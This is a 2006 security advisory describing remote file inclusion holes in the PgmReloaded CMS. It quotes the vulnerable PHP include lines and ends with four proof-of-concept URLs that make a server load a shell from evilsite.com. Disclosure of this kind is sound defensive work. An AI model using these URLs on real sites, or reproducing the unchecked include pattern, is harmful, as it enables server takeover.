<html><head><title>PgmReloaded <= 0.8.5 Multiple Remote File Include Vulnerabilities</title></head><pre>+-------------------------------------------------------------------------------------------
+ PgmReloaded &lt;= 0.8.5 Multiple Remote File Include Vulnerabilities
+-------------------------------------------------------------------------------------------
+ Vendor ............: http://matteolucarelli.net/
+ Affected Software .: PgmReloaded &lt;= 0.8.5
+ Download ..........: http://www.matteolucarelli.net/pgmreloaded/pgmreloaded-0.8.5.tgz
+ Description .......: &quot;PgmReloaded is a simple CMS for e-commerce and generic web catalogs&quot;
+ Class .............: Remote File Inclusion
+ Risk ..............: High (Remote File Execution)
+ Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
+-------------------------------------------------------------------------------------------
+ Details:
+ PgmReloaded has several scripts which do not initialize variables before using them to
+ include files, assuming register_globals = on, we can initialize any one of the variables
+ in a query string and include a remote file of our choice. The index.php file is vulnerable
+ to remote file inclusion regardless of register_globals settings.
+
+ Vulnerable Code:
+ index.php, line(s) 06:
+ -&gt; 06: if ($_GET[&quot;lang&quot;]!=&quot;&quot;) include ($_GET[&quot;lang&quot;] . &quot;.php&quot;);
+ common.inc.php, line(s) 08-17:
+ -&gt; 08: include ($CFG[&quot;libdir&quot;] . &quot;stdlib.inc.php&quot;);
+ -&gt; 09: include ($CFG[&quot;libdir&quot;] . &quot;phplib/db_&quot; . $CFG[&quot;dbms&quot;] . &quot;.inc.php&quot;);	// PHPLib...
+ -&gt; 10: include ($CFG[&quot;libdir&quot;] . &quot;pgm_&quot; . $CFG[&quot;dbms&quot;] . &quot;.inc.php&quot;);		// PGM extension...
+ -&gt; 11: include ($CFG[&quot;libdir&quot;] . $CFG[&quot;dbms&quot;] . &quot;_common.inc.php&quot;);
+ -&gt; 12: include ($CFG[&quot;libdir&quot;] . &quot;pgm_common.inc.php&quot;);
+ -&gt; 13: include ($CFG[&quot;libdir&quot;] . &quot;pgm_session.inc.php&quot;);
+ -&gt; 14: include ($CFG[&quot;libdir&quot;] . &quot;pgm_users.inc.php&quot;);
+ -&gt; 15: include ($CFG[&quot;libdir&quot;] . &quot;pgm_cart.inc.php&quot;);
+ -&gt; 16: include ($CFG[&quot;libdir&quot;] . &quot;phplib/template.inc.php&quot;);
+ -&gt; 17: include ($CFG[&quot;localedir&quot;] . $CFG[&quot;base_lang&quot;] . &quot;/base_lang.inc.php&quot;);
+ form_header.php, line(s) 07-15:
+ -&gt; 07: include ($CFG[&quot;localelangdir&quot;] . &quot;global-error.inc.php&quot;);
+ -&gt; 15: include ($CFG[&quot;localelangdir&quot;] . &quot;global-common.inc.php&quot;);
+
+ Proof Of Concept:
+ http://[target]/[path]/index.php?lang=http://evilsite.com/shell.php?
+ http://[target]/[path]/common.inc.php?CFG[libdir]=http://evilsite.com/shell.php?
+ http://[target]/[path]/common.inc.php?CFG[localedir]=http://evilsite.com/shell.php?
+ http://[target]/[path]/form_header.php?errormsg=1&amp;CFG[localelangdir]=http://evilsite.com/shell.php?
+-------------------------------------------------------------------------------------------

# milw0rm.com [2006-12-21]</pre></html>